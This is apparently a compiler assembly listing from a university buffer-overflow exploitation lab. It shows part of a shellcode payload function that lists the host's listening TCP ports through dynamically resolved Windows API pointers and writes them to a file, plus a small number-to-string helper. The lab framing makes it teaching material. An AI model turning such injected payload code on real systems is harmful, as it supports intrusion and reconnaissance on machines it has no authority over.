  003af	8b 45 f8	 mov	 eax, DWORD PTR _pTcpTable$[ebp]
  003b2	50		 push	 eax
  003b3	ff 95 30 ff ff
	ff		 call	 DWORD PTR _f_free$[ebp]

; 145  : 		pTcpTable = (MIB_TCPTABLE*)f_malloc(dwSize);

  003b9	8b 4d e4	 mov	 ecx, DWORD PTR _dwSize$[ebp]
  003bc	51		 push	 ecx
  003bd	ff 95 3c ff ff
	ff		 call	 DWORD PTR _f_malloc$[ebp]
  003c3	89 45 f8	 mov	 DWORD PTR _pTcpTable$[ebp], eax

; 146  : 		if (pTcpTable == NULL) 

  003c6	83 7d f8 00	 cmp	 DWORD PTR _pTcpTable$[ebp], 0
  003ca	75 05		 jne	 SHORT $LN14@ShellcodeP

; 147  : 		{
; 148  : 			f_ExitProcess(11);

  003cc	6a 0b		 push	 11			; 0000000bH
  003ce	ff 55 fc	 call	 DWORD PTR _f_ExitProcess$[ebp]
$LN14@ShellcodeP:

; 149  : 		}
; 150  : 	}
; 151  : 
; 152  : 	DWORD bytesWritten;
; 153  : 	char newLine = '\n';

  003d1	c6 45 f7 0a	 mov	 BYTE PTR _newLine$[ebp], 10 ; 0000000aH

; 154  : 
; 155  : 	if ((dwRetVal = f_GetTcpTable(pTcpTable, &dwSize, TRUE)) == NO_ERROR) 

  003d5	6a 01		 push	 1
  003d7	8d 55 e4	 lea	 edx, DWORD PTR _dwSize$[ebp]
  003da	52		 push	 edx
  003db	8b 45 f8	 mov	 eax, DWORD PTR _pTcpTable$[ebp]
  003de	50		 push	 eax
  003df	ff 95 54 ff ff
	ff		 call	 DWORD PTR _f_GetTcpTable$[ebp]
  003e5	89 45 e0	 mov	 DWORD PTR _dwRetVal$[ebp], eax
  003e8	83 7d e0 00	 cmp	 DWORD PTR _dwRetVal$[ebp], 0
  003ec	75 7f		 jne	 SHORT $LN16@ShellcodeP

; 156  : 	{
; 157  : 		for (int i = 0; i < (int)pTcpTable->dwNumEntries; i++) 

  003ee	c7 45 ec 00 00
	00 00		 mov	 DWORD PTR _i$2[ebp], 0
  003f5	eb 09		 jmp	 SHORT $LN4@ShellcodeP
$LN2@ShellcodeP:
  003f7	8b 4d ec	 mov	 ecx, DWORD PTR _i$2[ebp]
  003fa	83 c1 01	 add	 ecx, 1
  003fd	89 4d ec	 mov	 DWORD PTR _i$2[ebp], ecx
$LN4@ShellcodeP:
  00400	8b 55 f8	 mov	 edx, DWORD PTR _pTcpTable$[ebp]
  00403	8b 45 ec	 mov	 eax, DWORD PTR _i$2[ebp]
  00406	3b 02		 cmp	 eax, DWORD PTR [edx]
  00408	7d 61		 jge	 SHORT $LN3@ShellcodeP

; 158  : 		{
; 159  : 			if (pTcpTable->table[i].dwState == MIB_TCP_STATE_LISTEN)

  0040a	6b 4d ec 14	 imul	 ecx, DWORD PTR _i$2[ebp], 20
  0040e	8b 55 f8	 mov	 edx, DWORD PTR _pTcpTable$[ebp]
  00411	83 7c 0a 04 02	 cmp	 DWORD PTR [edx+ecx+4], 2
  00416	75 51		 jne	 SHORT $LN18@ShellcodeP

; 160  : 			{
; 161  : 				u_short port = f_ntohs((u_short)pTcpTable->table[i].dwLocalPort);

  00418	6b 45 ec 14	 imul	 eax, DWORD PTR _i$2[ebp], 20
  0041c	8b 4d f8	 mov	 ecx, DWORD PTR _pTcpTable$[ebp]
  0041f	0f b7 54 01 0c	 movzx	 edx, WORD PTR [ecx+eax+12]
  00424	52		 push	 edx
  00425	ff 95 38 ff ff
	ff		 call	 DWORD PTR _f_ntohs$[ebp]
  0042b	66 89 85 5c ff
	ff ff		 mov	 WORD PTR _port$1[ebp], ax

; 162  : 				WriteUShortToFile(hFile, port, f_WriteFile);

  00432	8b 85 4c ff ff
	ff		 mov	 eax, DWORD PTR _f_WriteFile$[ebp]
  00438	50		 push	 eax
  00439	0f b7 8d 5c ff
	ff ff		 movzx	 ecx, WORD PTR _port$1[ebp]
  00440	51		 push	 ecx
  00441	8b 95 50 ff ff
	ff		 mov	 edx, DWORD PTR _hFile$[ebp]
  00447	52		 push	 edx
  00448	e8 00 00 00 00	 call	 _WriteUShortToFile@12

; 163  : 				f_WriteFile(hFile, &newLine, 1, &bytesWritten, NULL);

  0044d	6a 00		 push	 0
  0044f	8d 85 2c ff ff
	ff		 lea	 eax, DWORD PTR _bytesWritten$[ebp]
  00455	50		 push	 eax
  00456	6a 01		 push	 1
  00458	8d 4d f7	 lea	 ecx, DWORD PTR _newLine$[ebp]
  0045b	51		 push	 ecx
  0045c	8b 95 50 ff ff
	ff		 mov	 edx, DWORD PTR _hFile$[ebp]
  00462	52		 push	 edx
  00463	ff 95 4c ff ff
	ff		 call	 DWORD PTR _f_WriteFile$[ebp]
$LN18@ShellcodeP:

; 164  : 			}
; 165  : 		}

  00469	eb 8c		 jmp	 SHORT $LN2@ShellcodeP
$LN3@ShellcodeP:

; 166  : 	}

  0046b	eb 05		 jmp	 SHORT $LN17@ShellcodeP
$LN16@ShellcodeP:

; 167  : 	else 
; 168  : 	{
; 169  : 		f_ExitProcess(12);

  0046d	6a 0c		 push	 12			; 0000000cH
  0046f	ff 55 fc	 call	 DWORD PTR _f_ExitProcess$[ebp]
$LN17@ShellcodeP:

; 170  : 	}
; 171  : 
; 172  : 	f_ExitProcess(1000);

  00472	68 e8 03 00 00	 push	 1000			; 000003e8H
  00477	ff 55 fc	 call	 DWORD PTR _f_ExitProcess$[ebp]

; 173  : }

  0047a	8b e5		 mov	 esp, ebp
  0047c	5d		 pop	 ebp
  0047d	c3		 ret	 0
_ShellcodePayload@0 ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /RTCu
; File D:\Activities\University\6 semester\MSCS\Labs\Lab_2_-_Buffer_overflow_exploitation\Shellcode\Shellcode\main.c
;	COMDAT _WriteUShortToFile@12
_TEXT	SEGMENT
_num$ = -16						; size = 6
_bytesWritten$ = -8					; size = 4
_i$ = -4						; size = 4
_hFile$ = 8						; size = 4
_shortVal$ = 12						; size = 4
_f_WriteFile$ = 16					; size = 4
_WriteUShortToFile@12 PROC				; COMDAT

; 176  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H

; 177  : 	char num[6] = { '0','0','0','0','0','\0' };

  00006	c6 45 f0 30	 mov	 BYTE PTR _num$[ebp], 48	; 00000030H
  0000a	c6 45 f1 30	 mov	 BYTE PTR _num$[ebp+1], 48 ; 00000030H
  0000e	c6 45 f2 30	 mov	 BYTE PTR _num$[ebp+2], 48 ; 00000030H
  00012	c6 45 f3 30	 mov	 BYTE PTR _num$[ebp+3], 48 ; 00000030H
  00016	c6 45 f4 30	 mov	 BYTE PTR _num$[ebp+4], 48 ; 00000030H
  0001a	c6 45 f5 00	 mov	 BYTE PTR _num$[ebp+5], 0

; 178  : 
; 179  : 	int i = 4;

  0001e	c7 45 fc 04 00
	00 00		 mov	 DWORD PTR _i$[ebp], 4
$LN2@WriteUShor:

; 180  : 	while (shortVal > 0)

  00025	83 7d 0c 00	 cmp	 DWORD PTR _shortVal$[ebp], 0
  00029	76 30		 jbe	 SHORT $LN3@WriteUShor

; 181  : 	{
; 182  : 		num[i] = (shortVal % 10) + 48;

  0002b	8b 45 0c	 mov	 eax, DWORD PTR _shortVal$[ebp]
  0002e	33 d2		 xor	 edx, edx
  00030	b9 0a 00 00 00	 mov	 ecx, 10			; 0000000aH
  00035	f7 f1		 div	 ecx
  00037	83 c2 30	 add	 edx, 48			; 00000030H
  0003a	8b 45 fc	 mov	 eax, DWORD PTR _i$[ebp]
  0003d	88 54 05 f0	 mov	 BYTE PTR _num$[ebp+eax], dl

; 183  : 		shortVal = shortVal / 10;

  00041	8b 45 0c	 mov	 eax, DWORD PTR _shortVal$[ebp]
  00044	33 d2		 xor	 edx, edx
  00046	b9 0a 00 00 00	 mov	 ecx, 10			; 0000000aH
  0004b	f7 f1		 div	 ecx
  0004d	89 45 0c	 mov	 DWORD PTR _shortVal$[ebp], eax

; 184  : 		i--;

  00050	8b 55 fc	 mov	 edx, DWORD PTR _i$[ebp]
  00053	83 ea 01	 sub	 edx, 1
  00056	89 55 fc	 mov	 DWORD PTR _i$[ebp], edx

; 185  : 	}

  00059	eb ca		 jmp	 SHORT $LN2@WriteUShor
$LN3@WriteUShor:

; 186  : 
; 187  : 	DWORD bytesWritten;
; 188  : 	f_WriteFile(hFile, &num, _strlen(num), &bytesWritten, NULL);

  0005b	6a 00		 push	 0
  0005d	8d 45 f8	 lea	 eax, DWORD PTR _bytesWritten$[ebp]
  00060	50		 push	 eax
  00061	8d 4d f0	 lea	 ecx, DWORD PTR _num$[ebp]
  00064	51		 push	 ecx
  00065	e8 00 00 00 00	 call	 __strlen@4
  0006a	50		 push	 eax
  0006b	8d 55 f0	 lea	 edx, DWORD PTR _num$[ebp]
  0006e	52		 push	 edx
  0006f	8b 45 08	 mov	 eax, DWORD PTR _hFile$[ebp]
  00072	50		 push	 eax
  00073	ff 55 10	 call	 DWORD PTR _f_WriteFile$[ebp]

; 189  : }

  00076	8b e5		 mov	 esp, ebp
  00078	5d		 pop	 ebp
  00079	c2 0c 00	 ret	 12			; 0000000cH
_WriteUShortToFile@12 ENDP
_TEXT	ENDS
END
